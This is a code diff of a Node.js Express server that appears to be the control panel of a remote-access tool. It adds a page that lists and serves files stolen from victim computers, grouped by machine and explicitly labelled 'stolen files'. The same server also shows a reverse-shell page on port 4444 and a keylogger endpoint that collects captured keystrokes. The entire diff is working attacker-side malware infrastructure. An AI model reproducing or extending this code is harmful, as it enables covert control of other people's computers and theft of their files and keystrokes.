@@ -9,16 +9,59 @@ tcpPort = 4444
 
 
 app.use('/files', express.static(__dirname+'/public'))
+app.use('/public/extracted_files', express.static(__dirname+'/public/extracted_files'))
 app.use(express.json());
 
 
-app.get(['/','/reverse-shell'], (req, res)=>{
+app.get('/reverse-shell', (req, res)=>{
   res.send(fs.readFileSync(__dirname + '/html/reverse-shell.html').toString())
 })
 
 app.get('/hacking', (req, res)=>{
   res.send(fs.readFileSync(__dirname + '/html/hacking-gif.html').toString())
 })
+
+app.get('/extracted-files-list', (req, res)=>{
+  let stolen_files_path = 'public/extracted_files'
+
+  //Load list of stolen files
+  let computer_array = []
+  for (computer of fs.readdirSync(stolen_files_path)){
+    if (fs.lstatSync(stolen_files_path+"/"+computer).isDirectory())
+      computer_array.push({
+        name: computer,
+        file_list: getDirectoryContents(stolen_files_path+"/"+computer,"")
+      })
+  }
+
+  //parse list into html
+  let insert_into_html = ""
+  for (computer of computer_array){
+    insert_into_html += "<div class=\"computer\"><span>" + computer.name + "</span><ul>"
+
+    for (file of computer.file_list){
+      insert_into_html += "<li><a class=\"file\" href=\""+ file.uri +"\">"+ file.name +"</a></li>"
+    }
+
+    insert_into_html += "</ul></div>"
+  }
+
+  html = fs.readFileSync(__dirname + '/html/extracted-files-list.html').toString()
+  html = html.replace("$insert_file_list$", insert_into_html)
+
+  //console.log(insert_into_html)
+
+  res.send(html)
+})
+
+app.get('/', (req, res)=>{
+  res.send(fs.readFileSync(__dirname + '/html/home.html').toString())
+})
+
+app.get('*', (req, res)=>{
+  res.redirect('/')
+})
+
 
 var keys = ""
 app.get('/keylogger', (req, res)=>{
@@ -103,4 +146,25 @@ function generateID(){
     }
   }
   return result;
+}
+
+
+function getDirectoryContents(base, path){
+  let resultArray = []
+  console.log(path)
+
+  for (file of fs.readdirSync(base + "/" + path)){
+    let current_path = base + "/" + path + "/" + file
+    let short_path = path + "/" + file
+    console.log(current_path)
+
+    if (fs.lstatSync(current_path).isDirectory()){
+      console.log("is path")
+      resultArray = resultArray.concat(getDirectoryContents(base, short_path))
+    }else{
+      resultArray.push({name: short_path, uri: base+"/"+short_path})
+      }
+    }
+
+return resultArray
 }
